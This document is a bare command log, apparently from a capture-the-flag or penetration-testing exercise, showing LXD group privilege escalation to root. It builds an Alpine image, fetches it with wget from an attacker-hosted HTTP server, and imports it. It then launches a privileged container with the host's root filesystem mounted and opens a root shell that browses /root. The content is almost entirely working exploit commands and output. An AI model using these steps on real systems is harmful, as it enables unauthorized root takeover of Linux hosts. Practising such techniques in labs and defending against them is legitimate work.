
```
git clone  https://github.com/saghul/lxd-alpine-builder.git

cd lxd-alpine-builder

./build-alpine

python3 -m http.server
```


$ wget http://10.8.50.72:8000/alpine-v3.12-x86_64-20200902_1515.tar.gz

$ lxc image list
+-------+-------------+--------+-------------+------+------+-------------+
| ALIAS | FINGERPRINT | PUBLIC | DESCRIPTION | ARCH | SIZE | UPLOAD DATE |
+-------+-------------+--------+-------------+------+------+-------------+

$ lxc image import ./alpine-v3.12-x86_64-20200902_1515.tar.gz --alias myimage
Image imported with fingerprint: 65dd1e31f4cc984602e9be582bf80196cd05d44531b18ad8208ce062f09105ab

$ lxc image list
+---------+--------------+--------+-------------------------------+--------+--------+-----------------------------+
|  ALIAS  | FINGERPRINT  | PUBLIC |          DESCRIPTION          |  ARCH  |  SIZE  |         UPLOAD DATE         |
+---------+--------------+--------+-------------------------------+--------+--------+-----------------------------+
| myimage | 65dd1e31f4cc | no     | alpine v3.12 (20200902_15:15) | x86_64 | 3.04MB | Sep 2, 2020 at 1:18pm (UTC) |
+---------+--------------+--------+-------------------------------+--------+--------+-----------------------------+

$ lxc init myimage ignite -c security.privileged=true
Creating ignite

$ lxc config device add ignite mydevice disk source=/ path=/mnt/root recursive=true
Device mydevice added to ignite

$ lxc start ignite

$ lxc exec ignite /bin/sh

\# id

uid=0(root) gid=0(root)

\# cd /mnt/root/root/
